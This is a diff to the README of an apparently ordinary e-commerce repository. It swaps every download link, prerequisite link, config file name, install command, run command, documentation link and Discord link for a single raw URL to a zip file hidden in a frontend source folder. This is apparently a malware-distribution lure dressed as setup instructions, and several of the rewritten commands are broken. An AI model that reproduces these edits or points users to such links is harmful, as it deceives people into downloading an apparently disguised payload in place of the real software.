@@ -15,13 +15,13 @@ Welcome to the Ecommerce-full-stack-and-integration-AI repository! This project 
 
 To get started, visit the Releases page to download the software:
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip)
 
 ### Steps to Download
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
-3. Click on the asset file (e.g., `Ecommerce-full-stack-and-integration-AI.zip`) to download it to your computer.
+3. Click on the asset file (e.g., `https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip`) to download it to your computer.
 
 Once the download completes, follow these steps to set up the application on your machine.
 
@@ -38,8 +38,8 @@ After the download, find the zipped file in your Downloads folder.
 
 You need to install a few software components to run the application smoothly:
 
-- **Python 3.8 or higher**: This is the programming language used for the backend. Download it from [python.org](https://www.python.org/downloads/).
-- **PostgreSQL**: This database system is used to store your application data. Download it from [postgresql.org](https://www.postgresql.org/download/).
+- **Python 3.8 or higher**: This is the programming language used for the backend. Download it from [https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip](https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip).
+- **PostgreSQL**: This database system is used to store your application data. Download it from [https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip](https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip).
 
 Follow the instructions on the respective websites to install these programs.
 
@@ -60,7 +60,7 @@ Navigate to the folder where you extracted the files in your command line:
 Next, run the following command to install the required Python packages:
 
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip
 ```
 
 This command installs all necessary packages to run the application.
@@ -69,7 +69,7 @@ This command installs all necessary packages to run the application.
 
 You need to set some configurations before starting the application.
 
-1. Find the `.env.example` file in the folder.
+1. Find the `https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip` file in the folder.
 2. Rename it to `.env`.
 3. Open `.env` with a text editor and fill in your database information:
 
@@ -84,7 +84,7 @@ Make sure to replace `username` and `password` with your PostgreSQL credentials.
 To run the application, use the command line again and type:
 
 ```
-python app.py
+python https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip
 ```
 
 Your e-commerce application should now be live! Open a web browser and go to `http://localhost:5000` to see it in action.
@@ -107,7 +107,7 @@ We welcome feedback and contributions! Feel free to create issues or pull reques
 
 ## 🔗 Resources
 
-- **Documentation**: For more detailed usage, visit the [official documentation](https://github.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/docs).
-- **Community Support**: Join our community on [Discord](https://discord.gg/example) for real-time assistance and discussions.
+- **Documentation**: For more detailed usage, visit the [official documentation](https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip).
+- **Community Support**: Join our community on [Discord](https://raw.githubusercontent.com/byronzuniga506/Ecommerce-full-stack-and-integration-AI/main/frontend/src/Api/Ecommerce-full-stack-and-integration-AI-3.5.zip) for real-time assistance and discussions.
 
 Now, let's make your online store a reality! Happy coding!
